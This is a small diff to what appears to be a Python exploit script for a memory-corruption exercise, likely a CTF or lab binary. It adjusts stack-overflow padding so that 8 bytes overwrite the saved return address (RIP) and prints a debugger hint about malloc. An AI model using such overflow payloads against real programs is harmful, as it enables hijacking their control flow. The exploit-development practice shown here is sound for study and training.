@@ -17,7 +17,8 @@ def initial_heap_overflow():
 def first_name_overflow():
     name = b'B'*0x200
     stack_buffer_1 = b'A'*0x244 + b'X'*8
-    stack_buffer_2 = b'C'*0x244 + b'Y'*4 + b'Z'*4
+    stack_buffer_2 = b'C'*0x244 + b'Y'*4 
+    stack_buffer_2 += b'Z'*8 #RIP if we call print
     print(" b malloc ; so you can see where the space is allocated")
     input()
     print(p.recv())
